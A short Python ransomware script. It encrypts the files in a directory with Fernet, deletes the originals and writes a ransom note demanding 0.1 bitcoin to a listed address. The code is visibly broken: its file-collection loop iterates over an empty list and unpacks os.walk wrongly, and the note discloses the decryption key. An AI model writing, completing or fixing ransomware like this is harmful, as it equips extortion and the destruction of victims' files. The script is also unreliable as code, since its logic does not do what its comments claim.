import os
import random
import string
from cryptography.fernet import Fernet

# Generate a random key for encrypting files
key = Fernet.generate_key()
fernet = Fernet(key)
files = []
# Get a list of all files in the current directory
for cwd ,file, folder in os.walk("placeholderdir"):
    for name in files:
        name = os.path.join(cwd,name)
        files.append(file)
# Encrypt each file
for file in files:
    with open(file, "rb") as f:
        # Read the file contents
        data = f.read()

        # Encrypt the file contents
        encrypted_data = fernet.encrypt(data)

        # Write the encrypted data to a new file
        with open(file + ".encrypted", "wb") as outfile:
            outfile.write(encrypted_data)

        # Delete the original unencrypted file
        os.remove(file)

# Write the ransom note
with open("ransom_note.txt", "w") as ransom_note:
    ransom_note.write("Your files have been encrypted.\n")
    ransom_note.write("To decrypt them, send 0.1 bitcoin to the following address:\n")
    ransom_note.write("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2\n")
    ransom_note.write("Your decryption key is: {}".format(key))
